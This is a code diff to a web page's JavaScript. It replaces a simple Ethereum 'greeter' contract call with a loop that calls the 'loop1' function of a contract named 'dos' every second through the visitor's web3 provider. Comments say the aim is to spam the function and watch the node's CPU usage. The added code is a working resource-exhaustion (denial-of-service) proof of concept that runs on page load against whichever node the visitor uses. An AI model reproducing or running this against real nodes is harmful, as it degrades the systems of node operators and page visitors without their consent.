@@ -25,15 +25,25 @@
                 document.getElementById("demo").innerHTML = "Found web3! ";
                 web3js = new Web3(web3.currentProvider);
 
-                document.getElementById("demo").innerHTML += "Starting calls. ";
+                var abi = [{"constant":false,"inputs":[],"name":"stop","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"stopped","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"start","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"loop1","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}];
+                var dos = web3.eth.contract(abi).at("0x96c80720bb467b759d7b78a09b1f2579eafd2991");
 
-                var abi = [{"constant":false,"inputs":[],"name":"kill","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"greet","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"_greeting","type":"string"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"}];
-                var greeter = web3.eth.contract(abi).at("0x5d5ae9cd88c098ee2bcf77efb5d2cca1c5ea1304");
+                // Succesfully constructed js object for dos
+                // Now we can spam the dos function :)
 
-                greeter.greet.call(function(error, result) {
-                    console.log('Error:', error);
-                    console.log(result);
-                });
+                document.getElementById("demo").innerHTML += "Starting calls. Make sure to check your node's cpu usage :)";
+
+                // Run every 1 second
+                window.setInterval(function() {
+                    dos.loop1.call(function(error, result) {
+                        if (error) {
+                            console.error(error);
+                            return;
+                        }
+
+                        console.log(result);
+                    });
+                }, 1000)
 
             }
         </script>
